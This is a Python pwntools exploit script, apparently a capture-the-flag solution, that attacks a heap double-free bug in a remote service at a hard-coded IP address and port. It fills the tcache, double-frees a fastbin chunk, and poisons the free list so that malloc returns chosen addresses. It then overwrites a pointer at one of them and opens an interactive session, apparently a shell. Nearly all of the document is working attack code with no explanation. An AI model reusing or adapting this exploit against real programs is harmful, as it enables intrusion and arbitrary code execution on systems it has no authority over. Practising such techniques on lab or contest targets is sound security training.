#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template double_free
from pwn import *

# Set up pwntools for the correct architecture
host = args.HOST or '107.21.135.41'
port = int(args.PORT or 16666)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

def clear(io: remote) -> None:
    io.recvuntil(b'e.g, l\n')

def malloc(io: remote) -> None:
    io.sendline(b'm 8')
    clear(io)

def free(io: remote, index: int) -> None:
    io.sendline(f'f { index }'.encode())
    clear(io)

def edit(io: remote, index: int, content: bytes) -> None:
    io.sendline(b'e %d %b' % (index, content))
    clear(io)

def launch_attack(io: remote) -> None:

    for _ in range(9):
        malloc(io)

    for i in range(7):
        free(io, i)

    free(io, 7)
    free(io, 8)
    free(io, 7)

    for _ in range(7):
        malloc(io)

    malloc(io)
    edit(io, 16, p64(0x404078)) 

    for _ in range(3):
        malloc(io)

    edit(io, 19, p64(0x401948)) 
    io.sendline(b'm 8')
    io.interactive()

launch_attack(io)
io.interactive()

